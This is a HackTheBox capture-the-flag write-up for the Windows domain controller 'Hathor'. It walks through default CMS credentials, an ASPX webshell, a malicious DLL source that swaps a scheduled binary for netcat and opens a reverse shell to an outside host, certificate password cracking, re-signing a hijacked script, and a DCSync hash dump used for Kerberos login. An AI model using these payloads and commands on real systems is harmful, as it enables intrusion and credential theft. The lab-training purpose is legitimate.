---
icon: alien
cover: ../../../../.gitbook/assets/Screenshot 2026-03-04 125432.png
coverY: -9.656591492537839
---

# HTB-HATHOR

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning with Rustscan

Starting with a comprehensive TCP port scan to identify active services:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ rustscan -a 10.10.11.147 --ulimit 5000 -- -sCV
```

The scan reveals a full suite of domain controller services. Multiple high-value ports are open:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  SMB
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp   open  ldapssl
3268/tcp  open  ldap          Global Catalog LDAP
3269/tcp  open  ldapssl       Global Catalog LDAPSSL
5985/tcp  open  wsman         WinRM
9389/tcp  open  adws          Active Directory Web Services
```

This is clearly a Windows domain controller. The NMAP scripts reveal the domain name `windcorp.htb` and hostname `hathor.windcorp.htb` from the LDAP certificate examination. The fact that Kerberos (88), LDAP (389), and DNS (53) are all open confirms we're dealing with an Active Directory environment.

Notably, the SMB enumeration shows `Message signing enabled and required`, which is a security hardening measure. The absence of NTLM support will be important later.

#### Website Enumeration

<figure><img src="../../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Visiting `http://10.10.11.147` shows a default IIS page with a link to `http://hathor.windcorp.htb/Secure/Login.aspx`. The site indicates it's "under construction" and mentions an intranet that will be coming soon. More importantly, there's a login form and account creation functionality, which tells us this is an actual application, not just a placeholder.

<figure><img src="../../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

The HTTP response headers show:

```
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
```

Examining the page source reveals references to "mojoPortal," which is a .NET-based CMS platform. This is the actual application running on the server.

#### Initial SMB Enumeration

Attempting basic enumeration of SMB shares returns an interesting error:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ crackmapexec smb 10.10.11.147 --shares
[-] Error enumerating shares: SMB SessionError: STATUS_NOT_SUPPORTED
```

The `STATUS_NOT_SUPPORTED` error indicates that NTLM authentication is disabled. This is a significant security measure that forces us toward Kerberos authentication instead. It also means we can't use null sessions or simple guest access.

***

### Website Exploitation

#### mojoPortal Default Credentials

mojoPortal, like many CMS platforms, ships with default credentials. A quick search reveals the standard defaults: `admin@admin.com / admin`.

Accessing the login form and entering these credentials successfully authenticates, granting us admin access to the mojoPortal interface. This gives us access to the administration panel with options for file management, system configuration, and more.

#### Enumeration and Version Detection

Under Administration → System Information, mojoPortal displays:

```
Version: 2.7.6.3
.NET Runtime: 4.0
Plugins: Various
```

This version doesn't appear in public exploit databases with critical vulnerabilities, but the admin access itself provides significant functionality.

#### File Upload Restrictions

The File Manager option allows file uploads, but there are restrictions in place:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ curl -F "file=@shell.aspx" http://hathor.windcorp.htb/FileManager
[!] Upload failed - .aspx extension not allowed
```

However, uploading files with `.txt` extensions succeeds. This is a common pattern—the application blocks dangerous executable extensions but allows arbitrary files with benign extensions.

#### Bypassing Extension Restrictions

Once a `.txt` file is uploaded, the File Manager's "Copy" feature allows us to copy the file to a new name with a `.aspx` extension. This bypasses the upload restriction:

```
Copy: cmd.txt → cmd.aspx
Location: /Data/Sites/1/media/cmd.aspx
```

Accessing the `.aspx` file directly via HTTP returns a webshell prompt. The IIS process now executes our code, but we're running in the context of the `web` user account with significant restrictions.

***

### Webshell to Shell as web

#### Initial Webshell Limitations

Through our ASPX webshell, we discover several restrictions:

1. **PowerShell is in ConstrainedLanguage mode** - Many PowerShell features are disabled
2. **Firewall blocks outbound connections** - Standard reverse shell attempts fail
3. **AppLocker rules** - Many executables and scripts cannot run

Running `whoami /priv` shows the `web` account, and attempts to execute binaries like `nc64.exe` don't generate callbacks, confirming firewall blocking.

#### Using Insomnia Webshell

Rather than fighting these restrictions with PowerShell or command-line utilities, we upload the **Insomnia webshell**. This is a feature-rich web-based shell with built-in reverse shell capabilities.

Unlike PowerShell or nc.exe, the reverse shell functionality executes entirely within the context of the IIS process (w3wp.exe), which bypasses the firewall restrictions since IIS is already allowed outbound on port 443.

Uploading and accessing the Insomnia webshell, then clicking "Connect Back Shell":

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ rlwrap -cAr ncat -lvnp 9999
Connection received on 10.10.11.147 50060
Microsoft Windows [Version 10.0.20348.643]

c:\windows\system32\inetsrv> whoami
windcorp\web
```

We now have an interactive shell as the `web` user.

***

### Privilege Escalation Path 1: DLL Hijacking to GinaWild

#### Reconnaissance

With shell access as `web`, we begin enumerating the system. In `C:\Users`, we find several users:

```
c:\Users> dir
AbbyMurr
Administrator
BeatriceMill
bpassrunner
GinaWild
web
```

At the root of `C:\`, we discover unusual directories:

```
C:\Get-bADpasswords
C:\script (not accessible)
C:\share
```

The `C:\share` directory contains:

```
AutoIt3_x64.exe
Bginfo64.exe
scripts\ (with 7-zip library and AutoIt scripts)
```

#### Process Monitoring

Using a loop in cmd.exe to monitor running processes:

```
FOR /L %i IN (0,1,1000) DO (
  tasklist /FI "imagename eq Bginfo64.exe" | findstr /v "No tasks" & 
  tasklist /FI "imagename eq AutoIt3_x64.exe" | findstr /v "No tasks" & 
  ping -n 2 127.0.0.1 > NUL 
)
```

Every few minutes, both `AutoIt3_x64.exe` and `Bginfo64.exe` appear briefly in the process list. This indicates a scheduled task is running these executables.

#### Permission Analysis

Checking ACLs on files in `C:\share`:

* **7-zip64.dll**: Writable by all users (`Everyone:(M)`)
* **AutoIt3\_x64.exe**: Read/Execute for users; ITDep group has Delete Children (DC)
* **Bginfo64.exe**: Writable by ITDep group (which includes GinaWild)

Since 7-zip64.dll is referenced by AutoIt scripts and writable by the `web` user, this is our hijacking vector.

#### DLL Injection

We create a malicious DLL in Visual Studio that will be loaded when AutoIt loads the library:

```cpp
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
        system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
        system("cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe C:\\share\\Bginfo64.exe");
        system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.6 9003");
        break;
    }
    return TRUE;
}
```

The DLL execution sequence:

1. **takeown** - Changes ownership of Bginfo64.exe to current user (GinaWild)
2. **cacls** - Grants full control to GinaWild
3. **copy** - Overwrites Bginfo64.exe with our nc64.exe reverse shell
4. **execute** - Runs the reverse shell

We upload this DLL, replacing 7-zip64.dll on the SMB share. When the scheduled task runs AutoIt and loads the DLL, our commands execute in GinaWild's context:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ rlwrap -cAr ncat -lvnp 9003
Connection received on 10.10.11.147 56824
Microsoft Windows [Version 10.0.20348.643]

c:\share> whoami
windcorp\ginawild
```

#### User Flag

The user flag is accessible from GinaWild's desktop:

```
c:\Users\GinaWild\Desktop> type user.txt
c7de9935************************
```

***

### Privilege Escalation Path 2: Certificate Theft and Script Signing

#### Finding Deleted Certificates

While enumerating GinaWild's home directory, nothing jumps out. However, checking the recycle bin (`C:\$Recycle.Bin`) reveals interesting content:

```
c:\$Recycle.Bin> dir /a
S-1-5-21-3783586571-2109290616-3725730865-2663 (GinaWild's SID)
```

Inside GinaWild's recycle bin directory are three `.pfx` certificate files:

```
$IZIX7VV.pfx (metadata)
$RLYS3KF.pfx (actual file)
$RZIX7VV.pfx (actual file)
```

The metadata file contains a string revealing the original path:

```
C:\Users\GinaWild\Desktop\cert.pfx
```

#### Certificate Extraction and Cracking

Downloading the files and examining them with OpenSSL shows they're password-protected PKCS#12 files. Using `crackpkcs12`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt $RLYS3KF.pfx
Dictionary attack - Password found: abceasyas123

┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt $RZIX7VV.pfx
Dictionary attack - Password found: whysoeasy?
```

Extracting the certificate details with OpenSSL:

```
Subject: CN=Administrator, CN=Users, DC=windcorp, DC=htb
Extended Key Usage: Code Signing
Key Usage: Digital Signature
```

This certificate is specifically for code signing and was likely issued to an administrator account.

#### Get-bADpasswords Script Hijacking

The `C:\Get-bADpasswords` directory contains a PowerShell script that's run via `run.vbs` (which is signed and AppLocker-whitelisted). The Get-bADpasswords.ps1 script has access to domain credentials.

With our stolen Administrator certificate, we can:

1. Modify the Get-bADpasswords.ps1 script
2. Re-sign it with the stolen certificate
3. Trigger execution via `run.vbs`

We add a command to the start of the script to extract domain admin credentials:

```powershell
whoami /all > C:\Programdata\goku.txt
```

After uploading the modified script, copying it into place, signing it with our stolen certificate, and triggering execution:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ cat goku.txt
USER INFORMATION
User Name: windcorp\bpassrunner
Groups: 
  - Domain Users
  - ITDep
  - Protected Users
```

The script runs as `bpassrunner`, a user in the ITDep group with special privileges.

#### Shell as bpassrunner

We update the script to execute a reverse shell:

```powershell
C:\share\Bginfo64.exe -e cmd 10.10.14.6 9004
```

After signing and triggering:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ rlwrap -cAr ncat -lvnp 9004
Connection received on 10.10.11.147 62144
C:\Get-bADpasswords> whoami
windcorp\bpassrunner
```

***

### Privilege Escalation Path 3: DCSync to Administrator

#### Understanding bpassrunner's Privileges

According to the Get-bADpasswords README, the tool requires "Domain Admin privileges or similar." The fact that bpassrunner can successfully run it suggests this account has delegated DCSync permissions.

#### Extracting Administrator Hash

With our shell as bpassrunner, we can perform a DCSync attack using the Get-ADReplAccount cmdlet:

```powershell
PS C:\Get-bADpasswords> Get-ADReplAccount -SamAccountName administrator -Server 'hathor.windcorp.htb'

DistinguishedName: CN=Administrator,CN=Users,DC=windcorp,DC=htb
Secrets
  NTHash: b3ff8d7532eef396a5347ed33933030f
```

The NTHash is the NTLM hash of the Administrator account password. With this hash, we can perform pass-the-hash attacks or crack it if needed.

#### Getting Administrator Shell

Using the hash with Kerberos authentication, we create a TGT (Ticket Granting Ticket) for the Administrator account:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ getTGT.py -hashes :b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator
[*] Saving ticket in administrator.ccache
```

With this cached ticket, we can use Evil-WinRM to get a shell as Administrator:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB
Evil-WinRM shell v3.4
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

***

### Alternative Credential Paths

#### Cracking BeatriceMill's Password

In the `C:\Get-bADpasswords\Accessible\CSVs` directory are exported CSV files containing hashes of users with weak passwords. The most recent export shows:

```
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;...;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'
```

The hash `9cb01504ba0247ad5c6e08f7ccae7903` cracks instantly on crackstation to `!!!!ilovegood17`.

With these credentials, we could have:

1. Set up Kerberos authentication (since NTLM is disabled)
2. Accessed SMB shares
3. Potentially found other attack vectors

However, this doesn't lead to privilege escalation on its own.

#### Kerberos Authentication Setup

When NTLM is disabled, we must use Kerberos. The setup requires:

1. **Update /etc/krb5.conf**:

```
[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HATHOR.WINDCORP.HTB
        admin_server = HATHOR.WINDCORP.HTB
    }
```

2. **Update /etc/resolv.conf** to point to the DC's DNS (10.10.11.147)
3. **Get a ticket**:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ kinit beatricemill@WINDCORP.HTB
Password for beatricemill@WINDCORP.HTB: [enter password]
```

4. **Access SMB shares**:

```
┌──(sn0x㉿sn0x)-[~/HTB/Hathor]
└─$ smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k
```

***

### Attack Flow

```
Initial Reconnaissance
├─ Rustscan: Identify domain controller services
├─ Website enumeration: Discover mojoPortal CMS
├─ SMB enumeration: Identify NTLM is disabled
└─ DNS: Extract domain name and hostname

Website Exploitation
├─ Default credentials: admin@admin.com / admin
├─ File upload: .txt bypass for .aspx execution
└─ ASPX webshell: Initial code execution

Initial Shell (web user)
├─ Insomnia webshell: Bypass firewall via IIS process
└─ Establish reverse shell: windcorp\web

Process Monitoring
├─ Discover AutoIt3_x64.exe runs periodically
├─ Discover Bginfo64.exe runs periodically
└─ Identify shared library: 7-zip64.dll

DLL Hijacking Attack
├─ Create malicious 7-zip64.dll
├─ Overwrite on SMB share (world-writable)
├─ DLL loads in AutoIt context (GinaWild)
├─ Takeown of Bginfo64.exe
├─ Replace Bginfo64.exe with nc64.exe
└─ Reverse shell as GinaWild

Certificate Theft
├─ Access recycle bin: Find deleted cert.pfx files
├─ Crack PKCS#12 passwords: crackpkcs12
├─ Extract Administrator certificate
└─ Certificate has Code Signing extended key usage

Script Hijacking via Signing
├─ Modify Get-bADpasswords.ps1
├─ Import stolen Administrator certificate
├─ Sign modified script with Set-AuthenticodeSignature
├─ Trigger execution via run.vbs
├─ Script runs as bpassrunner (domain privileges)
├─ Create reverse shell payload
└─ Shell as windcorp\bpassrunner

DCSync Attack
├─ Get-ADReplAccount -SamAccountName administrator
├─ Extract Administrator NTHash
├─ Use getTGT.py to create Kerberos ticket
└─ Evil-WinRM or wmiexec.py for SYSTEM shell

Flag Recovery
└─ Root flag from Administrator\Desktop\root.txt
```

***

### Techniques

| Technique                     | Classification        | Where Used                           | Why It Works                                                                          |
| ----------------------------- | --------------------- | ------------------------------------ | ------------------------------------------------------------------------------------- |
| Default Credential Abuse      | Web Exploitation      | mojoPortal admin panel               | CMS ships with well-known defaults                                                    |
| Extension-based Filter Bypass | Web Exploitation      | mojoPortal file upload               | Application blocks .aspx but allows .txt; Copy feature renames files                  |
| ASPX Webshell Creation        | Post-Exploitation     | IIS process code execution           | ASP.NET processes ASPX without AppLocker restriction                                  |
| Insomnia Webshell             | Firewall Bypass       | Reverse shell from IIS process       | Reverse shell executes in w3wp.exe context which has firewall exemptions              |
| Process Monitoring Loop       | Enumeration           | Discover scheduled tasks             | FOR loop with tasklist identifies periodically-running executables                    |
| ACL Enumeration               | Privilege Escalation  | Identify 7-zip64.dll weakness        | Permission analysis shows world-writable library in shared path                       |
| DLL Hijacking                 | Privilege Escalation  | 7-zip64.dll loaded by AutoIt         | AutoIt script imports DLL; we replace it with malicious version                       |
| Recycle Bin Recovery          | Credential Theft      | Find deleted certificate files       | Users often delete sensitive files thinking they're gone                              |
| PKCS#12 Password Cracking     | Credential Extraction | Certificate password breaking        | crackpkcs12 uses wordlist dictionary attack                                           |
| Authenticode Signing          | Script Execution      | Re-sign modified PowerShell script   | AppLocker allows scripts signed by specific certificates                              |
| DCSync Attack                 | Lateral Movement      | Extract domain credential hashes     | Account with Replicating Directory Changes permission can request AD secrets          |
| Kerberos TGT Creation         | Authentication        | getTGT.py generates ticket from hash | NTLM-disabled environments require Kerberos; tickets can be created from hashes       |
| Evil-WinRM                    | Remote Access         | WinRM shell as Administrator         | Uses Kerberos ticket for authentication; no password needed                           |
| File Permission Tricks        | Privilege Escalation  | takeown and cacls for ownership      | Administrator certificate context allows permission modification                      |
| Scheduled Task Exploitation   | Lateral Movement      | AutoIt DLL injection                 | Scheduled tasks run with higher privileges; if we control what they load, we escalate |

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
